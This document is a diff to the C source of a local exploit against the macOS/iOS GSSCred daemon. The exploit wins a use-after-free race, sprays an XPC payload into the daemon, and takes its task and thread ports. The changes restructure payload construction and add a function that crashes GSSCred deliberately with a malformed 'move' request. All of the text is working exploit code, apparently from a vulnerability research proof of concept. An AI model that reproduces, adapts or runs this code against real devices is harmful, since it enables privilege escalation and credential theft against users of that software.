@@ -578,9 +578,14 @@ struct gsscred_race_state {
 	// The current delay between sending the setattributes request and sending the delete
 	// request.
 	unsigned setattributes_to_delete_delay;
-	// GSSCred's task port. This is what we are trying to get.
+	// GSSCred's task port.
 	mach_port_t gsscred_task_port;
+	// A thread port for a thread in GSSCred's task.
+	mach_port_t gsscred_thread_port;
 };
+
+// Prototypes.
+static void gsscred_race_crash(struct gsscred_race_state *state);
 
 // Generate a large mapping consisting of many copies of the given data. Note that changes to the
 // beginning of the mapping will be reflected to other parts of the mapping, but possibly only if
@@ -638,7 +643,7 @@ fail_0:
 // Build the XPC spray data object that will (hopefully) get controlled data allocated at a fixed
 // address in GSSCred.
 static xpc_object_t
-gsscred_race_build_payload_spray(uint8_t *payload) {
+gsscred_race_build_payload_spray(const void *payload) {
 	// Repeat the payload several times to create a bigger payload block. This helps with the
 	// remapping process.
 	size_t block_size = GSSCRED_RACE_PAYLOAD_SIZE * PAYLOAD_COUNT_PER_BLOCK;
@@ -682,7 +687,8 @@ gsscred_race_create_listener_port(struct gsscred_race_state *state) {
 
 // Build the request objects for the GSSCred race. We do this all upfront.
 static void
-gsscred_race_build_requests(struct gsscred_race_state *state) {
+gsscred_race_build_requests(struct gsscred_race_state *state,
+		const char *uaf_string, const void *payload) {
 	uuid_t uuid  = { 0xab };
 	// Build the create request for the credential:
 	// {
@@ -702,18 +708,9 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
 	xpc_release(create_attributes);
 	state->create_request = create_request;
-	// Generate the UAF string and the exploit payload. The UAF string is the string that will
-	// be deserialized repeatedly in the hope that it overwrites the freed HeimCred, causing
-	// various object accesses to redirect to our exploit payload and eventually triggering
-	// controlled execution from the payload.
-	char uaf_string[GSSCRED_RACE_UAF_STRING_SIZE];
-	uint8_t *payload = malloc(GSSCRED_RACE_PAYLOAD_SIZE);
-	assert(payload != NULL);
-	gsscred_race_build_payload(uaf_string, payload);
 	// Generate the XPC data object that we will spray into GSSCred to map
 	// GSSCRED_RACE_PAYLOAD_ADDRESS with our exploit payload.
 	xpc_object_t payload_spray = gsscred_race_build_payload_spray(payload);
-	free(payload);
 	// Build the setattributes request for the target credential:
 	// {
 	//     "command":    "setattributes",
@@ -796,27 +793,27 @@ gsscred_race_start_port_listener(struct gsscred_race_state *state) {
 				ERROR("Receiving on Mach port listener returned %x", kr);
 				return;
 			}
-			if (msg.hdr.msgh_id != GSSCRED_RACE_MACH_MESSAGE_ID) {
-				DEBUG_TRACE(1, "Received unexpected message ID %x on listener "
-						"port", msg.hdr.msgh_id);
+			// Let the payload-specific message processor handle the message.
+			mach_port_t gsscred_task, gsscred_thread;
+			enum process_exploit_message_result result =
+				gsscred_race_process_exploit_message(&msg.hdr,
+					&gsscred_task, &gsscred_thread);
+			if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE) {
+				continue;
+			} else if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_KILL_AND_RETRY) {
+				WARNING("GSSCred is stuck in a bad state; "
+						"trying to induce a crash");
+				gsscred_race_crash(state);
 				continue;
 			}
-			// Check that the task port we received for GSSCred is valid.
-			mach_port_t gsscred_task = msg.hdr.msgh_remote_port;
-			int gsscred_pid = -1;
-			kr = pid_for_task(gsscred_task, &gsscred_pid);
-			if (kr != KERN_SUCCESS) {
-				WARNING("Message from exploit payload contains invalid "
-						"task port %x: %x", gsscred_task, kr);
-				continue;
-			}
+			assert(result == PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS);
 			// Everything looks good! Save the task port, cancel the connection, and
 			// exit. Cancelling the connection will cause the setattributes reply
 			// handler in gsscred_race_setattributes_async() to be invoked with
 			// XPC_ERROR_CONNECTION_INVALID if it hasn't fired already.
-			DEBUG_TRACE(1, "Got the task port: %x", gsscred_task);
-			DEBUG_TRACE(1, "GSSCred's PID is %u", gsscred_pid);
-			state->gsscred_task_port = gsscred_task;
+			DEBUG_TRACE(1, "Got GSSCred task port: %x", gsscred_task);
+			state->gsscred_task_port   = gsscred_task;
+			state->gsscred_thread_port = gsscred_thread;
 			xpc_connection_cancel(state->setattributes_connection);
 			return;
 		}
@@ -824,13 +821,25 @@ gsscred_race_start_port_listener(struct gsscred_race_state *state) {
 }
 
 // Initialize the state for exploiting the GSSCred race condition.
-static void
+static bool
 gsscred_race_init(struct gsscred_race_state *state) {
-	state->gsscred_task_port = MACH_PORT_NULL;
+	bzero(state, sizeof(*state));
+	// Generate the UAF string and the exploit payload. The UAF string is the string that will
+	// be deserialized repeatedly in the hope that it overwrites the freed HeimCred, causing
+	// various object accesses to redirect to our exploit payload and eventually triggering
+	// controlled execution from the payload.
+	char uaf_string[GSSCRED_RACE_UAF_STRING_SIZE];
+	uint8_t payload[GSSCRED_RACE_PAYLOAD_SIZE];
+	bool success = gsscred_race_build_exploit_payload(uaf_string, payload);
+	if (!success) {
+		return false;
+	}
+	// Initialize the race state.
 	gsscred_race_create_listener_port(state);
-	gsscred_race_build_requests(state);
+	gsscred_race_build_requests(state, uaf_string, payload);
 	state->setattributes_reply_done = dispatch_semaphore_create(0);
 	gsscred_race_start_port_listener(state);
+	return true;
 }
 
 // Clean up all resources used by the GSSCred race state.
@@ -951,6 +960,20 @@ gsscred_race_delete_credential_sync(struct gsscred_race_state *state) {
 	xpc_release(reply);
 }
 
+// Try to crash the GSSCred process.
+static void
+gsscred_race_crash(struct gsscred_race_state *state) {
+	gsscred_race_create_credential_sync(state);
+	xpc_object_t crash_request = xpc_dictionary_create(NULL, NULL, 0);
+	const uint8_t *uuid = xpc_dictionary_get_uuid(state->setattributes_request, "uuid");
+	xpc_dictionary_set_string(crash_request, "command", "move");
+	xpc_dictionary_set_uuid(  crash_request, "from",    uuid);
+	xpc_dictionary_set_uuid(  crash_request, "to",      uuid);
+	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
+			state->delete_connection, crash_request);
+	xpc_release(reply);
+}
+
 // Wait for all asynchronous messages to finish.
 static void
 gsscred_race_synchronize(struct gsscred_race_state *state) {
@@ -1004,7 +1027,8 @@ gsscred_race_run(struct gsscred_race_state *state) {
 		}
 		// If we got a Connection Interrupted error, then we crashed GSSCred.
 		if (state->connection_interrupted) {
-			DEBUG_TRACE(1, "Crash! Won the race after %zu %s, but failed to get "
+			WARNING("Crash!");
+			DEBUG_TRACE(1, "Won the race after %zu %s, but failed to get "
 					"GSSCred task port", try, (try == 1 ? "try" : "tries"));
 			break;
 		}
@@ -1028,12 +1052,15 @@ gsscred_race_run(struct gsscred_race_state *state) {
 
 // ---- Public API --------------------------------------------------------------------------------
 
-mach_port_t
-gsscred_race() {
+bool
+gsscred_race(mach_port_t *gsscred_task_port, mach_port_t *gsscred_thread_port) {
 	DEBUG_TRACE(1, "gsscred_race");
 	struct gsscred_race_state state;
 	// Initialize the race state.
-	gsscred_race_init(&state);
+	bool success = gsscred_race_init(&state);
+	if (!success) {
+		goto fail;
+	}
 	// Repeatedly try to win the race condition and execute our exploit payload.
 	for (size_t try = 1;; try++) {
 		// Try to win the race condition. If we succeed or encounter a fatal error, abort.
@@ -1051,5 +1078,8 @@ gsscred_race() {
 	// Clean up all race state.
 	gsscred_race_deinit(&state);
 	// Return the GSSCred task port, if we managed to get it.
-	return state.gsscred_task_port;
+fail:
+	*gsscred_task_port   = state.gsscred_task_port;
+	*gsscred_thread_port = state.gsscred_thread_port;
+	return (state.gsscred_task_port != MACH_PORT_NULL);
 }
